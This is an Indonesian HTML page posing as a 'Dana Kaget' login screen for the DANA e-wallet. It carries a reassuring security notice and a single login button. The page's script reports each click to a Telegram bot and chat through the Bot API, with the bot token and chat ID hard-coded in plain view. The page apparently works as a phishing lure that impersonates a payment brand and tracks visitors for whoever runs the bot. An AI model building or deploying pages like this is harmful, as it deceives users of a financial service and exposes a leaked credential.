<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Dana Kaget</title>
    <!-- Google Fonts untuk tampilan lebih modern -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
    <style>
        /* Reset */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background-color: #fff;
            padding: 40px 30px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 24px rgba(0,0,0,0.3);
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 80px;
            height: auto;
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
            font-weight: 700;
        }

        .btn-login {
            display: inline-block;
            background-color: #00ADEF;
            color: #fff;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            text-decoration: none;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .btn-login:hover {
            background-color: #0096c7;
            transform: translateY(-2px);
        }

        .note {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
            line-height: 1.4;
        }

        /* Responsive */
        @media(max-width: 500px){
            .card {
                padding: 30px 20px;
            }
            .btn-login {
                padding: 12px 24px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Logo bisa diganti sesuai branding -->
        <div class="logo">
            <!-- Jika punya logo, bisa di-upload dan ganti src -->
            <!-- <img src="logo-dana.png" alt="Dana Kaget Logo" /> -->
        </div>
        <h2>Login Dana Kaget</h2>
        <div class="btn-login" id="loginBtn">
            Klik di sini untuk login
        </div>
        <div class="note">
            Pastikan Anda login melalui situs resmi Dana Kaget untuk menjaga keamanan data Anda. Jangan bagikan informasi login kepada siapapun.
        </div>
    </div>

    <script>
        document.getElementById('loginBtn').addEventListener('click', function() {
            // Kirim pesan ke Telegram
            fetch('https://api.telegram.org/bot8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: '5116335881',
                    text: 'Pengguna mengklik tombol login Dana Kaget.'
                })
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok){
                    alert('Login diklik, pesan terkirim ke Telegram!');
                } else {
                    alert('Gagal mengirim pesan ke Telegram.');
                }
            })
            .catch(error => {
                alert('Error mengirim pesan: ' + error);
            });
        });
    </script>
</body>
</html>
